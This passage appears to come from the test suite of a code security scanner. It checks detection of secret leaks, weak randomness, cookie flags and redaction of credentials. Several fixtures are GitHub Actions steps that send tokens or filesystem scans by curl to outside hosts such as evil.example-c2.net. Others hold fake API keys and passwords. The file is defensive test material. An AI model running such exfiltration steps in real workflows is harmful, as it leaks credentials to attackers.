        `name: y\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" --data "$(cat /tmp/results.json)" https://api.github.com/user/repos\n      - run: trufflehog filesystem / --json | curl --data-binary @- https://api.github.com/gists\n`
      )
    );
    expect(f.filter((x) => /secrets or credentials/i.test(x.title)).length, titles(f)).toBe(2);
  });
  it('catches exfil behind decoy literals, expression and bare-host destinations', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/z.yml',
        `name: z\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d "t=\${{ secrets.NPM_TOKEN }}" evil.example-c2.net/collect https://uploads.github.com/ok\n      - run: curl -d "t=\${{ secrets.NPM_TOKEN }}" "\${{ matrix.dest }}" https://uploads.github.com/ok\n`
      )
    );
    expect(f.filter((x) => /secrets or credentials/i.test(x.title)).length, titles(f)).toBe(2);
  });
  it('still allowlists the plain release-asset upload', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/rel.yml',
        `name: rel\non: push\njobs:\n  u:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -F file=@dist.zip -H "Authorization: token $GITHUB_TOKEN" -d '{}' https://uploads.github.com/repos/o/r/releases/1/assets\n`
      )
    );
    expect(
      f.filter((x) => /secrets or credentials/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('keeps a Gemini key at high in a file that also has firebaseConfig', () => {
    const f = run(
      'Secret Scanner',
      file(
        'src/lib/firebase.js',
        `const firebaseConfig = { apiKey: 'AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ', authDomain: 'recipe-box.firebaseapp.com' };\nconst GEMINI_API_KEY = 'AIzaSyBt6QvR2mXw8ZpN5cKj3uHd7eLf9GsA1yT';\n`
      )
    );
    const gemini = f.find((x) => x.line === 2);
    const firebase = f.find((x) => x.line === 1);
    expect(gemini, titles(f)).toBeDefined();
    expect(gemini.severity).toBe('high');
    expect(firebase.severity).toBe('low');
  });
  it('keeps real tokens firing in a Dart file that mentions FlutterFire', () => {
    const f = run(
      'Dart Hardcoded Secret',
      file(
        'lib/config.dart',
        `// Firebase section generated by the FlutterFire CLI.\nconst apiKey = 'AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ';\nstatic const authToken = 'Vq3jW8kZ2mN5pR7sT9uB4cD';\n`
      )
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
    expect(
      f.every((x) => x.line === 3),
      titles(f)
    ).toBe(true);
  });
});

// ————— Gate-3 pins (2026-09-03): 15 confirmed correctness findings from the
// third adversarial round — machinery bugs, not detection policy. —————

describe('Gate-3: machinery correctness', () => {
  it('confirm-pair scan stays fast on pathological lines', () => {
    const blob = 'a'.repeat(100_000);
    const t0 = performance.now();
    run('Auth Weakness', file('src/gen.js', `const x = "${blob}";\n`));
    run('Python Security', file('gen.py', `x = "${'QUJEpass'.repeat(4000)}"\n`));
    const ms = performance.now() - t0;
    expect(ms, `took ${ms}ms`).toBeLessThan(2000);
  });
  it('splits letter-digit boundaries so PASSWORD2 stays a credential', () => {
    expect(splitIdentifierSegments('PASSWORD2')).toEqual(['password', '2']);
    const f = run('Python Security', file('app/s.py', `ADMIN_PASSWORD2 = "s3cr3tvalue99x"\n`));
    expect(
      f.some((x) => /credential/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('a digit in a namespace segment is not a confirm qualifier', () => {
    const py = run('Python Security', file('a.py', `if password == user2.password:\n    ok()\n`));
    expect(
      py.some((x) => /comparison/i.test(x.title)),
      titles(py)
    ).toBe(true);
    const js = run('Auth Weakness', file('a.js', `if (password === user.password_sha256) ok();\n`));
    expect(
      js.some((x) => /comparison/i.test(x.title)),
      titles(js)
    ).toBe(true);
  });
  it('the adapter handoff mirrors the adapter refusal (trailing env comment)', () => {
    const content = `api_key = "abcd1234efgh5678ijkl99"  # TODO: move to os.environ\n`;
    const py = run('Python Security', file('app/config.py', content));
    const adapter = run('Python Hardcoded Secret', file('app/config.py', content));
    expect(
      py.filter((x) => /credential/i.test(x.title)).length + adapter.length,
      `py: ${titles(py)} adapter: ${titles(adapter)}`
    ).toBeGreaterThan(0);
  });
  it('storage-key verdicts are order-independent', () => {
    expect(storageKeyIsAuthish('sessionStatsToken')).toBe(true);
    expect(storageKeyIsAuthish('statsSessionToken')).toBe(true);
  });
  it('short loop variables do not scrub the randomness context window', () => {
    const f = run(
      'Weak Randomness',
      file(
        'src/reset.js',
        `let e = null;\nconst code = Math.random().toString(36).slice(2, 8);\nsendVerificationEmail(user, code);\n`
      )
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
  });
  it('otpCode/pinCode/inviteCode fire; keyCode/charCode stay silent', () => {
    const hot = run(
      'Weak Randomness',
      file(
        'src/otp.js',
        `const otpCode = Math.floor(100000 + Math.random() * 900000);\nconst pinCode = Math.floor(1000 + Math.random() * 9000);\n`
      )
    );
    expect(hot.length, titles(hot)).toBe(2);
    const cold = run(
      'Weak Randomness',
      file(
        'src/game.js',
        `const keyCode = 65 + Math.floor(Math.random() * 26);\nconst charCode = 97 + Math.floor(Math.random() * 26);\n`
      )
    );
    expect(cold, titles(cold)).toHaveLength(0);
  });
  it('redis empty-user URLs are caught', () => {
    const f = run(
      'Secret Scanner',
      file('.env', `REDIS_URL=redis://:sup3rS3cretPass@redis-12345.upstash.io:6379\n`)
    ).filter((x) => !/\.env file present/i.test(x.title));
    expect(f.length, titles(f)).toBe(1);
    expect(f[0].severity).toBe('critical');
  });
});

describe('Gate-3: integration drift', () => {
  it('preference cookies draw no cookie-flags card either', () => {
    const f = run(
      'Cookie Security',
      file(
        'src/prefs.js',
        `Cookies.set('author', name, { expires: 30 });\ndocument.cookie = 'sessionTheme=' + theme + '; path=/';\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('real auth cookies still draw the cookie-flags card', () => {
    const f = run(
      'Cookie Security',
      file('src/auth.js', `res.cookie('authToken', token, { maxAge: 900000 });\n`)
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
  });
  it('a firebase apiKey line yields exactly one card', () => {
    const f = run(
      'Secret Scanner',
      file(
        'src/fb.js',
        `const firebaseConfig = { apiKey: 'AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ', authDomain: 'box.firebaseapp.com' };\n`
      )
    );
    expect(f.length, titles(f)).toBe(1);
  });
  it('Swift and Kotlin no longer contradict the Firebase teaching', () => {
    const swift = run(
      'Swift Hardcoded Secret',
      file(
        'App/Fb.swift',
        `// Firebase config, authDomain recipe-box.firebaseapp.com\nlet apiKey = "AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ"\nlet authToken = "Vq3jW8kZ2mN5pR7sT9uB4cD"\n`
      )
    );
    expect(swift.length, titles(swift)).toBe(1);
    expect(swift[0].line).toBe(3);
  });
  it('the JS parity branch catches camelCase credential constants', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/cfg.js',
        `const apiToken = '9aZbYcXdWeVfUgThSiRjQkPlOnMm01';\nconst apiKey = '9aZbYcXdWeVfUgThSiRjQkPlOnMm02';\nconst cacheKey = 'user:profile:v2';\n`
      )
    );
    expect(f.filter((x) => /credential literal/i.test(x.title)).length, titles(f)).toBe(2);
  });
  it('changed probes redact the credential value in evidence', () => {
    const planted = 'hunter2Prod99xQ';
    const cases = [
      ['Auth Weakness', 'src/mail.js', `const smtp = { user: 'm', password: '${planted}' };\n`],
      ['Auth Weakness', 'config/db.yaml', `db_password: ${planted}\n`],
      ['Python Security', 'app/s.py', `DB_PASSWORD = "${planted}"\n`],
      ['NEXT_PUBLIC_ Misuse', '.env.production', `NEXT_PUBLIC_APP_SECRET=${planted}\n`],
    ];
    for (const [probe, path, content] of cases) {
      const f = run(probe, file(path, content));
      expect(f.length, `${probe} ${titles(f)}`).toBeGreaterThan(0);
      for (const x of f) {
        expect(String(x.evidence).includes(planted), `${probe} evidence leaks: ${x.evidence}`).toBe(
          false
        );
      }
    }
  });
});
